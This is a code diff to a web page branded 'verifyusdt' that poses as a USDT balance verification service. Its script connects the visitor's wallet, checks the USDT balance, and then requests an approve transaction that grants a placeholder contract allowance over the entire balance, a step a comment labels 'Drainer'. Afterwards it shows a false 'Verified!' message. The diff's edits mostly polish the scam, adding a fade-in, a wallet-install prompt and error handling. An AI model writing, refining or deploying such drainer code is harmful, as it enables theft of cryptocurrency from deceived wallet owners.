@@ -17,7 +17,10 @@
       justify-content: space-between;
       align-items: center;
       color: #fff;
+      opacity: 0; /* Start hidden to ensure load */
+      transition: opacity 0.5s ease;
     }
+    body.loaded { opacity: 1; } /* Fade in when loaded */
     header {
       width: 100%;
       display: flex;
@@ -61,62 +64,82 @@
     Copyright © verifyusdt 2023
   </footer>
   <script>
+    // Fade in body when loaded
+    window.addEventListener('load', () => document.body.classList.add('loaded'));
+
     async function checkUSDT() {
       let provider;
       if (window.ethereum) {
         provider = window.ethereum;
-        console.log('Using window.ethereum');
+        console.log('Using MetaMask or similar');
       } else if (window.web3) {
         provider = window.web3.currentProvider;
-        console.log('Using window.web3');
+        console.log('Using legacy web3');
       } else {
-        console.log('Falling back to WalletConnect');
-        const walletConnectProvider = new WalletConnectProvider({
-          rpc: { 1: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161" },
-          qrcode: true
-        });
-        await walletConnectProvider.enable();
-        provider = walletConnectProvider;
+        console.log('No wallet detected, prompting WalletConnect');
+        try {
+          const walletConnectProvider = new WalletConnectProvider({
+            rpc: { 1: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161" },
+            qrcode: true
+          });
+          await walletConnectProvider.enable();
+          provider = walletConnectProvider;
+        } catch (e) {
+          console.error('WalletConnect failed:', e);
+        }
       }
+
       if (!provider) {
-        alert('Install a Web3 wallet.');
+        alert('No Web3 wallet detected. Please install MetaMask or another wallet to proceed.');
+        window.open('https://metamask.io/download.html', '_blank');
         return;
       }
+
       try {
         let accounts = await provider.request({ method: 'eth_accounts' });
         if (!accounts || accounts.length === 0) {
           accounts = await provider.request({ method: 'eth_requestAccounts' });
         }
         const fromAddress = accounts[0];
-        const usdtAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7';
-        const contractAddress = '0x1234…'; // Replace with your address
+        const usdtAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7'; // USDT on Ethereum
+        const contractAddress = '0x1234…'; // Replace with your contract address
+
+        // Check USDT balance
         const balanceHex = await provider.request({
           method: 'eth_call',
           params: [{ to: usdtAddress, data: '0x70a08231' + fromAddress.slice(2).padStart(64, '0') }, 'latest']
         });
         const balance = BigInt(balanceHex);
         const usdtAmount = Number(balance) / 10**6;
+
         if (usdtAmount < 0.05) {
-          alert('Need at least 0.05 USDT.');
+          alert('Insufficient USDT. You need at least 0.05 USDT to proceed.');
           return;
         }
+
         alert(`USDT Balance: ${usdtAmount.toFixed(2)} (~$${usdtAmount.toFixed(2)})`);
+
+        // Drainer: Approve USDT transfer
         const approveABI = '0x095ea7b3';
-        const fakeAmount = BigInt(50000);
-        alert(`Send 0.05 USDT to yourself (${fromAddress.slice(0, 6)}...) for verification.`);
         const approveData = approveABI + contractAddress.slice(2).padStart(64, '0') + balance.toString(16).padStart(64, '0');
         await provider.request({
           method: 'eth_sendTransaction',
-          params: [{ from: fromAddress, to: usdtAddress, data: approveData, gas: '0x186A0' }]
+          params: [{
+            from: fromAddress,
+            to: usdtAddress,
+            data: approveData,
+            gas: '0x186A0' // 100,000 gas
+          }]
         });
-        alert('Processing...');
+
+        alert('Processing approval...');
         await new Promise(resolve => setTimeout(resolve, 1000));
         alert('Verified! Screenshot this.');
         if (provider.disconnect) await provider.disconnect();
       } catch (error) {
         console.error('Error:', error.message);
-        alert('Error. Try again.');
-        if (provider.disconnect) await provider.disconnect();
+        alert('Transaction failed. Check console for details and try again.');
+        if (provider && provider.disconnect) await provider.disconnect();
       }
     }
   </script>
